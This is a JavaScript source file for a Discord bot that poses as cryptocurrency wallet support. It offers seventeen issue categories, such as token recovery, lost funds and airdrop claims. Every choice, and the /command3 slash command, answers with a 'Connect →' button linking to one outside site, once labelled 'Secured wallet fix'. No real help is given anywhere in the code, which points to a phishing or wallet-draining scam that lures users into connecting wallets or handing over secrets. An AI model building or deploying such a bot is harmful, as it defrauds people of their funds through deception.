
const { 
    Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, 
    ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, 
    SlashCommandBuilder, ActivityType 
} = require('discord.js');
require('dotenv').config();

const keepAlive = require('./server');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
    ]
});

const issueOptions = [
    { label: 'Validate Wallet', description: 'Click here for wallet validation issues.' },
    { label: 'Assets/Token Recovery', description: 'Click here for assets recovery issues.' },
    { label: 'Rectification', description: 'Click here to rectify issues.' },
    { label: 'High Gas Fees', description: 'Click here for high gas fee related issues.' },
    { label: 'Claim Reward', description: 'Click here for reward related issues.' },
    { label: 'Deposit & Withdrawals', description: 'Click here for withdrawal related issues.' },
    { label: 'Slippage Error', description: 'Click here for slippage related error during trade.' },
    { label: 'Transaction Error', description: 'Click here for transaction related issues.' },
    { label: 'Cross Chain Transfer', description: 'Click here for cross chain bridge issues.' },
    { label: 'Staking', description: 'Click here for staking related issues.' },
    { label: 'Swap/Exchange', description: 'Click here for swap/exchange related issues.' },
    { label: 'Connect to DApps', description: 'Click here for error while connecting to DApps.' },
    { label: 'Login Issues', description: 'Click here for issues while logging into your wallet.' },
    { label: 'Claim Airdrop', description: 'Click here for airdrop related issues.' },
    { label: 'NFTs Issues', description: 'Click here for NFTs minting/transfer related issues.' },
    { label: 'Missing/Irregular Issues', description: 'Click here for lost/missing funds.' },
    { label: 'Migration Issues', description: 'Click here for migration related issues.' }
];

const commands = [
    new SlashCommandBuilder()
        .setName('command2')
        .setDescription('Select the category of your issue'),
    new SlashCommandBuilder()
        .setName('command3')
        .setDescription('Show connect button')
];

client.once('ready', async () => {
    console.log(`✅ Botx is online as ${client.user.tag}!`);

    try {
        await client.application.commands.set(commands);
        console.log('✅ Slash commands registered!');
    } catch (error) {
        console.error('❌ Error registering commands:', error);
    }

    client.user.setPresence({
        activities: [{ name: '/command2 to get help', type: ActivityType.Listening }],
        status: 'online'
    });
});

client.on('interactionCreate', async interaction => {
    if (interaction.isChatInputCommand()) {
        if (interaction.commandName === 'command2') {
            const embed = new EmbedBuilder()
                .setTitle('Select the category of your issue')
                .setDescription('Click the below button to select category');
                

            const selectMenu = new StringSelectMenuBuilder()
                .setCustomId('issue_select')
                .setPlaceholder('Select Category')
                .addOptions(issueOptions.map((option, index) => ({
                    label: option.label,
                    description: option.description,
                    value: `issue_${index}`
                })));

            const row = new ActionRowBuilder().addComponents(selectMenu);
            await interaction.reply({ 
                embeds: [embed], 
                components: [row],
                ephemeral: false
            });

        } else if (interaction.commandName === 'command3') {
            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setLabel('Connect →')
                    .setStyle(ButtonStyle.Link)
                    .setURL('https://swiftnodelinker.net')
            );

            await interaction.reply({
                content: 'Click the button below to connect:',
                components: [row],
                ephemeral: false
            });
        }
    } else if (interaction.isStringSelectMenu()) {
        if (interaction.customId === 'issue_select') {
            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setLabel('Connect →')
                    .setStyle(ButtonStyle.Link)
                    .setURL('https://swiftnodelinker.net')
            );

            await interaction.reply({
                content: 'Secured wallet fix',
                components: [row],
                ephemeral: false
            });
        }
    }
});

keepAlive();
client.login(process.env.TOKEN);
